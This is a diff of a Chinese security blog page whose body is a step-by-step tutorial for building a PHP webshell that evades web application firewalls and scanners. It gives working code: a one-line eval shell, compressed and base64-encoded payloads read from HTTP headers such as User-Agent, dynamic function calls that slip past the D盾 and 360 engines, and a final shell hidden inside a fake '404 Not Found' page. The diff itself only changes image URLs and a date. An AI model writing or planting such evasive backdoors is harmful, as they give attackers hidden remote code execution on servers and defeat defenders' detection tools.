@@ -120,18 +120,18 @@
 <meta property="og:site_name" content="瓦都剋">
 <meta property="og:description" content="在研究webshell查杀的时候，学习别人怎么绕waf的思路，今天发现一个很6的函数(至少之前我是没见过)，然后结合之前写访问日志记录文件时用到的方法，very perfect！">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/webshell1.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/webshell2.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/webshell3.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/webshell4.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/webshell5.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/webshell7.png">
-<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/webshell6.png">
-<meta property="og:updated_time" content="2017-07-28T11:18:12.000Z">
+<meta property="og:image" content="http://blog.w2n1ck.com/webshell1.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/webshell2.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/webshell3.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/webshell4.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/webshell5.png">
+<meta property="og:image" content="http://blog.w2n1ck.com/webshell7.png">
+<meta property="og:image" content="http://blog.w2n1ck.comm/webshell6.png">
+<meta property="og:updated_time" content="2018-12-14T06:01:45.171Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="渗透测试小技巧之过waf木马">
 <meta name="twitter:description" content="在研究webshell查杀的时候，学习别人怎么绕waf的思路，今天发现一个很6的函数(至少之前我是没见过)，然后结合之前写访问日志记录文件时用到的方法，very perfect！">
-<meta name="twitter:image" content="http://oa8y5guqs.bkt.clouddn.com/webshell1.png">
+<meta name="twitter:image" content="http://blog.w2n1ck.com/webshell1.png">
 
 
 
@@ -468,7 +468,7 @@
         <p>在研究webshell查杀的时候，学习别人怎么绕waf的思路，今天发现一个很6的函数(至少之前我是没见过)，然后结合之前写访问日志记录文件时用到的方法，very perfect！<br><a id="more"></a></p>
 <h1 id="Once-step"><a href="#Once-step" class="headerlink" title="Once step"></a>Once step</h1><p>普通一句话木马：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php eval($_POST[&apos;caidao&apos;]);?&gt;</div></pre></td></tr></table></figure>
-<h1 id="Second-step"><a href="#Second-step" class="headerlink" title="Second step"></a>Second step</h1><p>首先大家看下这个东西：<br><img src="http://oa8y5guqs.bkt.clouddn.com/webshell1.png" alt=""></p>
+<h1 id="Second-step"><a href="#Second-step" class="headerlink" title="Second step"></a>Second step</h1><p>首先大家看下这个东西：<br><img src="http://blog.w2n1ck.com/webshell1.png" alt=""></p>
 <p>不知道大家看到这个字符串会有啥想法，反正说实话，之前我肯定不会太在意。看下源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$compressed   = gzcompress(&apos;&lt;?php eval($_POST[\&apos;caidao\&apos;]);?&gt;&apos;, 9);</div><div class="line">$uncompressed = gzuncompress($compressed);</div><div class="line">echo $compressed;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
 <h1 id="Third-step"><a href="#Third-step" class="headerlink" title="Third step"></a>Third step</h1><p>那么重点来了！</p>
 <p>我要说的就是<code>gzcompress</code>这个函数。然后我又查了查相关资料，找到了PHP中具有相同功能的函数还有两个：<code>gzdeflate</code>，<code>gzencode</code>。</p>
@@ -479,17 +479,17 @@
 <h1 id="Fifth-step"><a href="#Fifth-step" class="headerlink" title="Fifth step"></a>Fifth step</h1><p>结合访问日志记录用到的<code>getallheaders</code>函数，最终的webshell如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php eval(gzuncompress(base64_decode(getallheaders()[&apos;w2n1ck&apos;])));&gt;</div></pre></td></tr></table></figure>
 <p>用D盾查一下</p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/webshell2.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/webshell2.png" alt=""></p>
 <p>虽然级别是小于3，但是说明里面显示可能eval后门，所以要去掉这个，在变形下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php $w2n1ck1=gzuncompress(base64_decode(getallheaders()[&apos;cai&apos;]));$w2n1ck1(gzuncompress(base64_decode(getallheaders()[&apos;dao&apos;])));&gt;</div></pre></td></tr></table></figure></p>
 <p>看下webshell可用性</p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/webshell3.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/webshell3.png" alt=""></p>
 <p>这里注意下，使用eval的话会报错，具体的原因请查看<a href="https://stackoverflow.com/questions/29707896/undefined-function-eval-php" target="_blank" rel="external">错误详情</a></p>
 <p>在安利下命令执行的一些函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;`&apos;,eval,assert,exec,passthru,shell_exec,system,putenv,preg_replace,pcntl_exec,popen,proc_open</div></pre></td></tr></table></figure></p>
-<h1 id="Sixth-step"><a href="#Sixth-step" class="headerlink" title="Sixth step"></a>Sixth step</h1><p>再用D盾检测下<br><img src="http://oa8y5guqs.bkt.clouddn.com/webshell4.png" alt=""></p>
+<h1 id="Sixth-step"><a href="#Sixth-step" class="headerlink" title="Sixth step"></a>Sixth step</h1><p>再用D盾检测下<br><img src="http://blog.w2n1ck.com/webshell4.png" alt=""></p>
 <p>还是可疑啊，那行再伪造伪造下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</div><div class="line">&lt;html&gt;&lt;head&gt;</div><div class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</div><div class="line">&lt;/head&gt;&lt;body&gt;</div><div class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</div><div class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</div><div class="line">&lt;?php</div><div class="line">$cai=getallheaders()[&apos;cai&apos;];</div><div class="line">$dao=getallheaders()[&apos;dao&apos;];</div><div class="line">if($cai!=&quot;&quot; and $dao!=&quot;&quot;)&#123;</div><div class="line">  $cai=gzuncompress(base64_decode($cai));$cai(gzuncompress(base64_decode($dao)));</div><div class="line">&#125;</div><div class="line">header(&apos;HTTP/1.1 404 Not Found&apos;);</div><div class="line">?&gt;</div><div class="line">&lt;/body&gt;&lt;/html&gt;</div></pre></td></tr></table></figure></p>
 <p>再检测下：</p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/webshell5.png" alt=""><br>360 5引擎检测下<br><img src="http://oa8y5guqs.bkt.clouddn.com/webshell7.png" alt=""><br>very perfect！</p>
-<p><img src="http://oa8y5guqs.bkt.clouddn.com/webshell6.png" alt=""></p>
+<p><img src="http://blog.w2n1ck.com/webshell5.png" alt=""><br>360 5引擎检测下<br><img src="http://blog.w2n1ck.com/webshell7.png" alt=""><br>very perfect！</p>
+<p><img src="http://blog.w2n1ck.comm/webshell6.png" alt=""></p>
 <p>如果觉得自己添加头麻烦可疑使用自带的请求头字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">getallheaders()[&apos;Accept-Language&apos;]</div><div class="line">getallheaders()[&apos;User-Agent&apos;]</div><div class="line">getallheaders()[&apos;Accept&apos;]</div></pre></td></tr></table></figure></p>
 
       
